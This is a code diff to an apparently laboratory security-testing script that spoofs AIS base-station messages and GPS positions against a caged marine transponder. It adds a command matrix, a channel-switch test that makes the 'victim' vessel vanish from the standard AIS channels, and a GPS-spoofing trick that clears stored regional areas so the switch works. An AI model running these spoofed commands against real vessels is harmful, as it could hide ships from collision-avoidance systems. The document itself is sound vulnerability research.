@@ -707,6 +707,29 @@ def build_chanmgmt(ctx):
 M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
 
 
+def build_chanmgmt_switch(ctx):
+    """Minimal channel-switch test, to run ALONE (ideally with --clear-region). The unit LOCKS a
+    regional area after the first Msg 22 that sets one, and then ignores any later Msg 22 for that
+    area -- so the switch only takes if it is the FIRST regional command the unit sees. Sending the
+    power/Tx-Rx cells (also regional Msg 22, on the default channels) first plants a 87/88 area that
+    blocks the switch, which is exactly what happened in the full-suite run. So this builder is just
+    announce, then the regional switch to the alt channels: ship first (authority; expect ignored),
+    then base (expect the victim to leave AIS1/AIS2)."""
+    V = ctx.victim_mmsi
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement")
+    return [
+        ("cm_announce_base", [m4]),
+        ("cm_m22_ship_altchan",
+            [m4, (_m22_regional(REGULAR_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+                  f"M22 (ordinary ship) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect IGNORED")]),
+        ("cm_m22_base_altchan",
+            [m4, (_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+                  f"M22 (base) regional switch to {ALT_CH_A}/{ALT_CH_B} -- expect victim leaves AIS1/AIS2")]),
+    ]
+
+
 # Frequency sweep targets: which channel numbers does a unit accept? 2087/2088 are the default
 # AIS pair and 2084/2085 are near-band AIS alternates; the interesting cases are the ones OUTSIDE
 # the AIS band (a unit that retunes there would emit AIS on a channel used for other VHF services)
@@ -760,6 +783,56 @@ def build_chanmgmt_recover(ctx):
         _m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=0, tx_rx=0),
         _m23_group(BASE_MMSI, vlat, vlon, interval=0, quiet=0),
         enc.encode_type16(BASE_MMSI, ctx.victim_mmsi, offset_a=20, increment_a=0),
+    ]
+
+
+def build_matrix_segments(ctx):
+    """The full base-station command matrix, split into segments that are each run from a freshly
+    cleared regional state (the runner clears the region before every segment). Grouping rationale:
+    M16 (rate), M20 (slots), and M23 (group) do not lock a regional channel area, so they share one
+    cleared state and are tested base-then-ship together. Each regional Msg 22 -- power, Tx/Rx, and
+    the channel switch from ship then from base -- gets its OWN cleared state, because the unit
+    locks a regional area after the first Msg 22 that sets one and then ignores later ones."""
+    V = ctx.victim_mmsi
+    vlat, vlon = ctx.victim_lat, ctx.victim_lon
+    m4 = (enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
+          "Msg4 base-station announcement")
+    def m20b(src):
+        return [m4] + [(enc.encode_type20(src, offset1=off, slots1=15, timeout1=7),
+                        f"M20 reserve slots {off}-{off+14}") for off in M20_TARGET_OFFSETS]
+    return [
+        ("rate_slot_group", [
+            ("mx_m16_base",   [m4, (enc.encode_type16(BASE_MMSI, V, offset_a=600, increment_a=0),
+                                    "M16 (base) force MAX reporting rate")]),
+            ("mx_m16_ship",   [m4, (enc.encode_type16(REGULAR_MMSI, V, offset_a=600, increment_a=0),
+                                    "M16 (ship) force MAX rate -- authority test")]),
+            ("mx_m16_release",[m4, (enc.encode_type16(BASE_MMSI, V, offset_a=20, increment_a=0),
+                                    "M16 (base) release rate")]),
+            ("mx_m20_base",   m20b(BASE_MMSI)),
+            ("mx_m20_ship",   m20b(REGULAR_MMSI)),
+            ("mx_m23_base",   [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=11),
+                                    "M23 (base) group slow reporting interval")]),
+            ("mx_m23_ship",   [m4, (_m23_group(REGULAR_MMSI, vlat, vlon, interval=11),
+                                    "M23 (ship) group slow -- authority test")]),
+            ("mx_m23_clear",  [m4, (_m23_group(BASE_MMSI, vlat, vlon, interval=0),
+                                    "M23 (base) clear group assignment")]),
+        ]),
+        ("power", [
+            ("mx_m22_power_base", [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, power=1),
+                                        "M22 (base) LOW power on default channels")]),
+        ]),
+        ("txrx", [
+            ("mx_m22_txrxA_base", [m4, (_m22_regional(BASE_MMSI, vlat, vlon, DEF_CH_A, DEF_CH_B, tx_rx=1),
+                                        "M22 (base) Tx on channel A only")]),
+        ]),
+        ("switch_ship", [
+            ("mx_m22_switch_ship", [m4, (_m22_regional(REGULAR_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+                                         f"M22 (ship) switch to {ALT_CH_A}/{ALT_CH_B} -- expect IGNORED")]),
+        ]),
+        ("switch_base", [
+            ("mx_m22_switch_base", [m4, (_m22_regional(BASE_MMSI, vlat, vlon, ALT_CH_A, ALT_CH_B),
+                                         f"M22 (base) switch to {ALT_CH_A}/{ALT_CH_B} -- expect victim leaves AB")]),
+        ]),
     ]
 
 
@@ -902,6 +975,17 @@ def main():
     ap.add_argument("--chanmgmt-postroll", type=float, default=90.0,
                     help="no-injection window after the suite to see whether the victim "
                          "returns to AIS1/AIS2 once the default channels are restored")
+    ap.add_argument("--chanmgmt-matrix", action="store_true",
+                    help="ONE hands-off run that tests every base-station command (M16 rate, M20 "
+                         "slots, M23 group, M22 power, M22 Tx/Rx, and the M22 channel switch from "
+                         "ship then base), automatically clearing the regional area before each so "
+                         "the unit's area-lock never blocks a later command. Long (~35-40 min) but "
+                         "self-recovers the unit at the end. Recorder on AB throughout.")
+    ap.add_argument("--chanmgmt-switch-only", action="store_true",
+                    help="run ONLY the channel switch (announce + regional Msg 22 to the alt "
+                         "channels, ship then base). The unit locks a regional area after the first "
+                         "Msg 22 that sets one, so the switch must be the first regional command; "
+                         "pair with --clear-region for a clean run. This reproduces the vanish.")
     ap.add_argument("--chanmgmt-no-switch", action="store_true",
                     help="run the channel-management suite but OMIT the channel-switch cells, so "
                          "the unit never leaves the default channels and every test self-recovers "
@@ -962,24 +1046,25 @@ def main():
         start_lat=args.lat, start_lon=args.lon, gps_port=args.gps_port)
     print(f"GPS feeding victim @ {args.lat},{args.lon} on {args.gps_port}")
 
-    # Optional: clear any stored regional operating area before attacking. A manually-entered
-    # region outranks a Msg 22 broadcast, so it blocks the channel switch (observed: the attack
-    # works from a clean unit but not once a manual region is set). Regional area data is deleted
-    # when the unit is >500 miles from where the area was registered, and that distance rule is not
-    # gated by source priority -- so we feed a far-away position, hold it while the unit runs its
-    # regional housekeeping, then return to the cage position in a clean state.
-    if args.clear_region:
+    def do_clear_region(tag=""):
+        """Feed a position >500 mi away so the unit deletes any stored regional operating area
+        (manual or Msg 22-set) by the distance rule, then return to the cage position. This both
+        removes a region that would block a channel switch AND recovers a unit stranded on the alt
+        channels (deleting the active area reverts it to the default channels), all over serial."""
         far_lat = args.lat + args.clear_region_offset
         miles = args.clear_region_offset * 69.0
-        print(f"clear-region: feeding a position {args.clear_region_offset:.0f} deg (~{miles:.0f} mi) "
-              f"north for {args.clear_region_dwell:.0f}s to delete any stored regional area...")
+        print(f"    [clear-region{tag}] feeding ~{miles:.0f} mi away for {args.clear_region_dwell:.0f}s "
+              f"to delete any stored regional area...")
         gps.set_position(far_lat, args.lon)
-        rec(event="clear_region_start", far_lat=far_lat, far_lon=args.lon,
-            dwell=args.clear_region_dwell, note="feed >500mi so the unit deletes stored regional areas")
+        rec(event="clear_region_start", tag=tag, far_lat=far_lat, far_lon=args.lon,
+            dwell=args.clear_region_dwell)
         time.sleep(args.clear_region_dwell)
         gps.set_position(args.lat, args.lon)
-        rec(event="clear_region_end", note="returned to cage position; stored regional/manual area should be deleted")
-        print("clear-region: back at the cage position; the unit should now be region-free.")
+        rec(event="clear_region_end", tag=tag)
+        print(f"    [clear-region{tag}] back at the cage position; region-free.")
+
+    if args.clear_region:
+        do_clear_region()
 
     print(f"settling {args.settle}s so the transponder gets a fix...")
     time.sleep(args.settle)
@@ -987,7 +1072,8 @@ def main():
     ctx = Ctx(args.victim_mmsi, gps)
     timeline = build_timeline(ctx)
     if (args.phase2_only or args.phase3_only or args.extras_only or args.chanmgmt_only
-            or args.chanmgmt_sweep or args.chanmgmt_recover or args.photo):
+            or args.chanmgmt_switch_only or args.chanmgmt_matrix or args.chanmgmt_sweep
+            or args.chanmgmt_recover or args.photo):
         timeline = []
     if args.only:
         timeline = [(n, p) for (n, p) in timeline if n in args.only]
@@ -1126,9 +1212,9 @@ def main():
                         time.sleep(args.gap)
 
         # ---- channel-management / base-authority suite (--chanmgmt or --chanmgmt-only) ----
-        if args.chanmgmt or args.chanmgmt_only:
-            cm = build_chanmgmt(ctx)
-            if args.chanmgmt_no_switch:
+        if args.chanmgmt or args.chanmgmt_only or args.chanmgmt_switch_only:
+            cm = build_chanmgmt_switch(ctx) if args.chanmgmt_switch_only else build_chanmgmt(ctx)
+            if args.chanmgmt_no_switch and not args.chanmgmt_switch_only:
                 # drop the channel-switch cells; keep everything the unit self-recovers from, so a
                 # repeat run never strands it off-channel (recovery is a painful manual overwrite).
                 cm = [(n, p) for (n, p) in cm if "altchan" not in n]
@@ -1185,6 +1271,45 @@ def main():
             print("  channel cannot reach it. Clear its regional/channel settings from the MKD")
             print(f"  front panel, or retune the ais-simulator to {ALT_CH_A}/{ALT_CH_B} and run")
             print("  rf_session.py --chanmgmt-recover to send the restore on that channel.")
+            print("!" * 72)
+
+        # ---- FULL base-station command matrix (--chanmgmt-matrix): one hands-off run ----
+        if args.chanmgmt_matrix:
+            segs = build_matrix_segments(ctx)
+            print("\n" + "=" * 72)
+            print("  BASE-STATION COMMAND MATRIX. Keep the recorder on AB the whole time. This")
+            print("  auto-clears the regional area before EACH segment (feeds a far position), so it")
+            print(f"  is long (~{len(segs)+1} clears, roughly 35-40 min) but hands-off, and the final")
+            print("  clear recovers the unit to AIS1/AIS2. Do not stop until it prints MATRIX DONE.")
+            print("=" * 72)
+            rec(event="chanmgmt_matrix_start", n_segments=len(segs),
+                base_mmsi=BASE_MMSI, regular_mmsi=REGULAR_MMSI,
+                alt_ch=(ALT_CH_A, ALT_CH_B), def_ch=(DEF_CH_A, DEF_CH_B))
+            for si, (seg_name, cells) in enumerate(segs):
+                do_clear_region(tag=f":{seg_name}")
+                time.sleep(20)   # let the fix re-settle at the cage position before commanding
+                rec(event="matrix_segment_start", name=seg_name, index=si)
+                print(f"\n=== SEGMENT {si+1}/{len(segs)}: {seg_name} "
+                      f"({len(cells)} command{'s' if len(cells) != 1 else ''}) ===")
+                for ci, (name, payloads) in enumerate(cells):
+                    src = "ship" if "ship" in name else "base"
+                    if   "m22" in name: cmd = "M22"
+                    elif "m20" in name: cmd = "M20"
+                    elif "m16" in name: cmd = "M16"
+                    elif "m23" in name: cmd = "M23"
+                    else:               cmd = "announce"
+                    fire(name, payloads, ci, len(cells), tag=f"MX:{seg_name}:",
+                         extra={"command": cmd, "source": src, "segment": seg_name})
+                    if ci < len(cells) - 1:
+                        short = name.endswith(("release", "clear"))
+                        time.sleep(8 if short else args.chanmgmt_gap)
+                rec(event="matrix_segment_end", name=seg_name)
+            # final clear-region recovers the unit from the switch strand
+            do_clear_region(tag=":final-recover")
+            rec(event="chanmgmt_matrix_end")
+            print("\n" + "!" * 72)
+            print("  MATRIX DONE. The final clear-region should have reverted the unit to AIS1/AIS2.")
+            print("  Stop the recorders and send the RF nmea, serial nmea, and this manifest.")
             print("!" * 72)
 
         # ---- frequency sweep (--chanmgmt-sweep): which channels does the unit accept? ----
